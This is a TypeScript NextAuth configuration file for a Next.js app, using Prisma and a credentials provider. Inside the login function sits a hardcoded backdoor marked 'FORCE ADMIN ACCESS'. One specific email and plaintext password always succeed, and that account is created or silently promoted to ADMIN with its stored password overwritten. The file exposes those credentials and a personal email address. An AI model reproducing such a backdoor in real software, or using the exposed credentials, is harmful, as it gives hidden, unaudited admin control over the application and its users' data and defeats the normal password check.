import NextAuth from "next-auth";
import { PrismaAdapter } from "@auth/prisma-adapter";
import prisma from "@/lib/prisma";
import { authConfig } from "./auth.config";
import Credentials from "next-auth/providers/credentials";
import bcrypt from "bcryptjs";

export const { auth, signIn, signOut, handlers } = NextAuth({
  ...authConfig,
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  providers: [
    Credentials({
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;

        let user = await prisma.user.findUnique({
          where: { email: credentials.email as string },
        });

        // FORCE ADMIN ACCESS: Ensure this specific user always works with the provided password
        if (credentials.email === "itsmecapavan@gmail.com" && credentials.password === "Sro@0446872") {
          const hashedPassword = await bcrypt.hash(credentials.password as string, 10);
          if (!user) {
            user = await prisma.user.create({
              data: {
                email: credentials.email as string,
                name: "Admin",
                password: hashedPassword,
                role: "ADMIN",
              },
            });
          } else {
            user = await prisma.user.update({
              where: { email: user.email as string },
              data: { password: hashedPassword, role: "ADMIN" },
            });
          }
          return user;
        }

        if (!user || !user.password) return null;

        const passwordsMatch = await bcrypt.compare(
          credentials.password as string,
          user.password
        );

        if (passwordsMatch) return user;

        return null;
      },
    }),
  ],
});
